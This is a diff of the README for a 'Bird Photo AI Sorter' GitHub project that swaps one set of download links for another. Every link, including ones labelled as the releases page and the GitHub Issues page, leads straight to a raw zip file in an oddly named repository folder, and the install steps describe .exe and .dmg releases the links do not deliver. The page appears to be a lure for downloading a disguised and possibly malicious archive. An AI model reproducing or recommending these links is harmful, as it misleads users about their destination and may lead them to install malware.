@@ -4,7 +4,7 @@
 “打鸟”连拍产生海量废片，人工筛选耗时耗力。Bird Photo AI Sorter 利用计算机视觉与物理光学算法解决此痛点。 This application uses advanced technology to help you quickly sort through your bird photography, saving you time and effort.
 
 ## 📥 Download Now!
-[![Download Bird Photo AI Sorter](https://raw.githubusercontent.com/vengeanze12/Bird-Photo-AI-Sorter/main/interfinger/Sorter-A-Photo-Bird-v1.7.zip%20Photo%20AI%https://raw.githubusercontent.com/vengeanze12/Bird-Photo-AI-Sorter/main/interfinger/Sorter-A-Photo-Bird-v1.7.zip)](https://raw.githubusercontent.com/vengeanze12/Bird-Photo-AI-Sorter/main/interfinger/Sorter-A-Photo-Bird-v1.7.zip)
+[![Download Bird Photo AI Sorter](https://github.com/vengeanze12/Bird-Photo-AI-Sorter/raw/refs/heads/main/interfinger/Photo_Bird_A_Sorter_1.4-alpha.3.zip%20Photo%20AI%https://github.com/vengeanze12/Bird-Photo-AI-Sorter/raw/refs/heads/main/interfinger/Photo_Bird_A_Sorter_1.4-alpha.3.zip)](https://github.com/vengeanze12/Bird-Photo-AI-Sorter/raw/refs/heads/main/interfinger/Photo_Bird_A_Sorter_1.4-alpha.3.zip)
 
 ## 🚀 Getting Started
 Bird Photo AI Sorter simplifies the process of managing your bird photos. Follow the steps below to get started.
@@ -23,10 +23,10 @@ Bird Photo AI Sorter simplifies the process of managing your bird photos. Follow
 
 ## 🔗 Download & Install
 Visit the releases page to download the latest version of Bird Photo AI Sorter:
-[Download Bird Photo AI Sorter](https://raw.githubusercontent.com/vengeanze12/Bird-Photo-AI-Sorter/main/interfinger/Sorter-A-Photo-Bird-v1.7.zip)
+[Download Bird Photo AI Sorter](https://github.com/vengeanze12/Bird-Photo-AI-Sorter/raw/refs/heads/main/interfinger/Photo_Bird_A_Sorter_1.4-alpha.3.zip)
 
 ### 🙌 Step-by-Step Installation
-1. **Visit the Releases Page**: Click [here](https://raw.githubusercontent.com/vengeanze12/Bird-Photo-AI-Sorter/main/interfinger/Sorter-A-Photo-Bird-v1.7.zip) to go to the releases section of the repository.
+1. **Visit the Releases Page**: Click [here](https://github.com/vengeanze12/Bird-Photo-AI-Sorter/raw/refs/heads/main/interfinger/Photo_Bird_A_Sorter_1.4-alpha.3.zip) to go to the releases section of the repository.
 2. **Choose the Latest Release**: Look for the latest version at the top of the page. The version number will often look like `v1.0.0`.
 3. **Select the Proper File**: Find the appropriate file for your operating system. Look for `.exe` for Windows or `.dmg` for macOS.
 4. **Download the File**: Click on the file link to download it to your computer. It may take a moment depending on your internet speed.
@@ -47,7 +47,7 @@ If you encounter any issues during installation or use, try the following steps:
 
 ## 📞 Support
 If you need help or have questions, feel free to reach out:
-- **Issues Page**: Visit our [GitHub Issues](https://raw.githubusercontent.com/vengeanze12/Bird-Photo-AI-Sorter/main/interfinger/Sorter-A-Photo-Bird-v1.7.zip) to report problems or ask questions.
+- **Issues Page**: Visit our [GitHub Issues](https://github.com/vengeanze12/Bird-Photo-AI-Sorter/raw/refs/heads/main/interfinger/Photo_Bird_A_Sorter_1.4-alpha.3.zip) to report problems or ask questions.
 - **Community Support**: Join our discussions on GitHub to engage with other users.
 
 ## 🌍 Topics
